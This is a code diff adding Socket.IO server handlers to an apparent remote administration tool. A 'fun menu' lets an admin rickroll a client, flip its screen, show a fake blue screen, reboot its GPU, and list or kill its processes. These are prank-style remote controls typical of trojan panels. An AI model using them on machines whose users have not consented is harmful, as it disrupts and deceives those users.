@@ -950,6 +950,102 @@ io.on('connection', (socket) => {
     io.to(data.requestId).emit('admin:fs-rename-response', data);
   });
 
+  // ========== FUN MENU FEATURES ==========
+
+  // Rickroll
+  socket.on('admin:fun-rickroll', (data: { clientId: string }) => {
+    console.log(`[Admin] Fun: Rickroll for client ${data.clientId}`);
+    const client = connectedClients.get(data.clientId);
+    if (client) {
+      io.to(data.clientId).emit('server:fun-rickroll');
+      logActivity({
+        type: 'diagnostics',
+        clientId: data.clientId,
+        clientHostname: client.hostname,
+        adminId: socket.id,
+        details: 'Fun: Rickroll activated'
+      });
+    }
+  });
+
+  // Flip Screen
+  socket.on('admin:fun-flip-screen', (data: { clientId: string; enabled: boolean }) => {
+    console.log(`[Admin] Fun: Flip Screen ${data.enabled ? 'ON' : 'OFF'} for client ${data.clientId}`);
+    const client = connectedClients.get(data.clientId);
+    if (client) {
+      io.to(data.clientId).emit('server:fun-flip-screen', { enabled: data.enabled });
+      logActivity({
+        type: 'diagnostics',
+        clientId: data.clientId,
+        clientHostname: client.hostname,
+        adminId: socket.id,
+        details: `Fun: Screen ${data.enabled ? 'flipped' : 'unflipped'}`
+      });
+    }
+  });
+
+  // Fake BSOD
+  socket.on('admin:fun-fake-bsod', (data: { clientId: string }) => {
+    console.log(`[Admin] Fun: Fake BSOD for client ${data.clientId}`);
+    const client = connectedClients.get(data.clientId);
+    if (client) {
+      io.to(data.clientId).emit('server:fun-fake-bsod');
+      logActivity({
+        type: 'diagnostics',
+        clientId: data.clientId,
+        clientHostname: client.hostname,
+        adminId: socket.id,
+        details: 'Fun: Fake BSOD triggered'
+      });
+    }
+  });
+
+  // GPU Reboot
+  socket.on('admin:fun-gpu-reboot', (data: { clientId: string }) => {
+    console.log(`[Admin] Fun: GPU Reboot for client ${data.clientId}`);
+    const client = connectedClients.get(data.clientId);
+    if (client) {
+      io.to(data.clientId).emit('server:fun-gpu-reboot');
+      logActivity({
+        type: 'diagnostics',
+        clientId: data.clientId,
+        clientHostname: client.hostname,
+        adminId: socket.id,
+        details: 'Fun: GPU reboot initiated'
+      });
+    }
+  });
+
+  // Get Processes
+  socket.on('admin:get-processes', (data: { clientId: string }) => {
+    console.log(`[Admin] Get Processes for client ${data.clientId}`);
+    io.to(data.clientId).emit('server:get-processes', { requestId: socket.id });
+  });
+
+  // Client responds with process list
+  socket.on('client:processes-list', (data: { requestId: string; processes: any[] }) => {
+    io.to(data.requestId).emit('admin:processes-list', {
+      clientId: socket.id,
+      processes: data.processes
+    });
+  });
+
+  // Kill Process
+  socket.on('admin:kill-process', (data: { clientId: string; pid: number }) => {
+    console.log(`[Admin] Kill Process PID ${data.pid} on client ${data.clientId}`);
+    const client = connectedClients.get(data.clientId);
+    if (client) {
+      io.to(data.clientId).emit('server:kill-process', { pid: data.pid });
+      logActivity({
+        type: 'diagnostics',
+        clientId: data.clientId,
+        clientHostname: client.hostname,
+        adminId: socket.id,
+        details: `Fun: Killed process PID ${data.pid}`
+      });
+    }
+  });
+
   // Disconnessione
   socket.on('disconnect', () => {
     const client = connectedClients.get(socket.id);
